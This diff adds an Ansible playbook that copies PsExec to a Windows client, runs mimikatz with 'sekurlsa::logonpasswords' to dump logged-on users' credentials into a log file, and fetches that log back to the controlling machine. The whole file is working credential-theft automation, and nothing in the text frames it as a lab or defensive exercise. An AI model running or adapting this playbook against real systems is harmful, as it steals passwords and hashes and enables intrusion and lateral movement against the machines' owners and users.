@@ -1,0 +1,27 @@
+- name: "Connexion Remotly from Server to client"
+  hosts: "client"
+  gather_facts: "false"
+
+  tasks:
+    
+  
+    - name: Copy PsExec
+      win_copy:
+       src: files/PsExec.exe
+       dest: C:\mimikat\mimikat\x64\PsExec.exe
+       force: yes
+
+
+    - name: Run mimikatz remotly
+      win_psexec:
+       command: C:\mimikat\mimikat\x64\mimikatz.exe "log ana.txt " "privilege::debug"  "sekurlsa::logonpasswords" exit 
+       executable: C:\mimikat\mimikat\x64\PsExec.exe 
+
+    - name: Copy Mimikatz log from remorte to local
+      fetch:
+       src: C:\Users\dbendaoui3333\ana.txt
+       dest: /tmp/
+#       remote_src: yes 
+       flat: yes
+ #      delegate_to: localhost   
+       force: yes
